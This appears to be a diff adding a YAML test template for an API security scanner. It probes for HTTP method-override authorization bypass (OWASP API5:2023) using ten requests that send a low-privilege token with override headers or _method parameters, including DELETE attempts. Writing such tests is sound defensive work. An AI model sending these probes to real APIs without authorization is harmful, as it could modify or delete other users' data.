@@ -1,0 +1,177 @@
+id: api5-method-override
+
+info:
+  name: "HTTP Method Override Authorization Bypass"
+  category: "API5:2023"
+  severity: "HIGH"
+  requires_llm_triage: true
+  test_pattern: "simple"
+
+endpoint_selector:
+  requires_auth: true
+  methods: ["GET", "POST"]
+
+role_selector:
+  attacker_permission_level: "lower"
+  victim_permission_level: "higher"
+
+http:
+  # Test 1: X-HTTP-Method-Override header with PUT
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      X-HTTP-Method-Override: "PUT"
+      Content-Type: "application/json"
+    body: '{"test":"method-override-put"}'
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "updated", "modified", "changed", "saved"]
+        part: body
+        condition: or
+
+  # Test 2: X-HTTP-Method-Override header with DELETE
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      X-HTTP-Method-Override: "DELETE"
+      Content-Type: "application/json"
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "deleted", "removed", "destroyed"]
+        part: body
+        condition: or
+
+  # Test 3: X-HTTP-Method-Override header with PATCH
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      X-HTTP-Method-Override: "PATCH"
+      Content-Type: "application/json"
+    body: '{"test":"method-override-patch"}'
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "updated", "patched", "modified", "changed"]
+        part: body
+        condition: or
+
+  # Test 4: X-Method-Override header variant with PUT
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      X-Method-Override: "PUT"
+      Content-Type: "application/json"
+    body: '{"test":"method-override-put"}'
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "updated", "modified", "changed", "saved"]
+        part: body
+        condition: or
+
+  # Test 5: X-HTTP-Method header variant with DELETE
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      X-HTTP-Method: "DELETE"
+      Content-Type: "application/json"
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "deleted", "removed", "destroyed"]
+        part: body
+        condition: or
+
+  # Test 6: Query parameter _method with PUT
+  - method: "POST"
+    path: "{{operation.path}}?_method=PUT"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      Content-Type: "application/json"
+    body: '{"test":"method-override-put"}'
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "updated", "modified", "changed", "saved"]
+        part: body
+        condition: or
+
+  # Test 7: Query parameter _method with DELETE
+  - method: "POST"
+    path: "{{operation.path}}?_method=DELETE"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      Content-Type: "application/json"
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "deleted", "removed", "destroyed"]
+        part: body
+        condition: or
+
+  # Test 8: Body parameter _method with PUT
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      Content-Type: "application/json"
+    body: '{"_method":"PUT","test":"method-override-put"}'
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "updated", "modified", "changed", "saved"]
+        part: body
+        condition: or
+
+  # Test 9: Body parameter _method with DELETE
+  - method: "POST"
+    path: "{{operation.path}}"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      Content-Type: "application/json"
+    body: '{"_method":"DELETE"}'
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "deleted", "removed", "destroyed"]
+        part: body
+        condition: or
+
+  # Test 10: GET with X-HTTP-Method-Override to DELETE
+  - method: "GET"
+    path: "{{operation.path}}"
+    headers:
+      Authorization: "Bearer {{attacker_token}}"
+      X-HTTP-Method-Override: "DELETE"
+    matchers:
+      - type: status
+        status: [200, 201, 204]
+      - type: word
+        words: ["success", "deleted", "removed", "destroyed"]
+        part: body
+        condition: or
+
+detection:
+  success_indicators:
+    - type: status_code
+      status_code: [200, 201, 204]
+    - type: body_field
+      body_field: "message"
+      exists: true
+  vulnerability_pattern: "attacker_used_method_override_to_bypass_method_based_authorization"
